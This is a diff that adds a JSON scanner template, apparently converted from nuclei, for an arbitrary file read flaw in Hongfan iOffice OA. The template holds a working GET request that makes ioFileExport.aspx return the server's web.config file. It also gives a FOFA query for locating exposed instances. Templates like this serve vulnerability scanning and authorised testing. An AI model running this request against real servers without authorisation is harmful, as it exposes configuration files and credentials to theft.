@@ -1,0 +1,128 @@
+{
+  "id": "hongfan-ioffice-lfi",
+  "name": "Hongfan OA ioFileExport.aspx - Arbitrary File Read",
+  "author": "SleepingBag945",
+  "severity": "MEDIUM",
+  "description": "Arbitrary File Read vulnerability in the Hongfan OA ioFileExport.aspx file, through which an attacker can obtain sensitive server information\n",
+  "references": [
+    "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E7%BA%A2%E5%B8%86OA/%E7%BA%A2%E5%B8%86OA%20ioFileExport.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md",
+    "https://github.com/qingchenhh/qc_poc/blob/main/Goby/ioffice_file_read.go"
+  ],
+  "tags": [
+    "hongfan",
+    "lfi"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"红帆-ioffice\""
+  },
+  "variables": {
+    "filename": [
+      "{{rand_base(5)}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/ioffice/prg/set/iocom/ioFileExport.aspx?url\u003d/ioffice/web.config\u0026filename\u003d{{filename}}.txt\u0026ContentType\u003dapplication/octet-stream",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(body, \"configSection\") \u0026\u0026 contains(body, \"iOfficeUpload\")",
+            "contains(header, \"application/octet-stream\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "hongfan-ioffice-lfi",
+    "info": {
+      "name": "Hongfan OA ioFileExport.aspx - Arbitrary File Read",
+      "author": "SleepingBag945",
+      "severity": "medium",
+      "description": "Arbitrary File Read vulnerability in the Hongfan OA ioFileExport.aspx file, through which an attacker can obtain sensitive server information\n",
+      "reference": [
+        "https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E7%BA%A2%E5%B8%86OA/%E7%BA%A2%E5%B8%86OA%20ioFileExport.aspx%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md",
+        "https://github.com/qingchenhh/qc_poc/blob/main/Goby/ioffice_file_read.go"
+      ],
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "app\u003d\"红帆-ioffice\""
+      },
+      "tags": "hongfan,lfi"
+    },
+    "variables": {
+      "filename": "{{rand_base(5)}}"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/ioffice/prg/set/iocom/ioFileExport.aspx?url\u003d/ioffice/web.config\u0026filename\u003d{{filename}}.txt\u0026ContentType\u003dapplication/octet-stream"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(body, \"configSection\") \u0026\u0026 contains(body, \"iOfficeUpload\")",
+              "contains(header, \"application/octet-stream\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
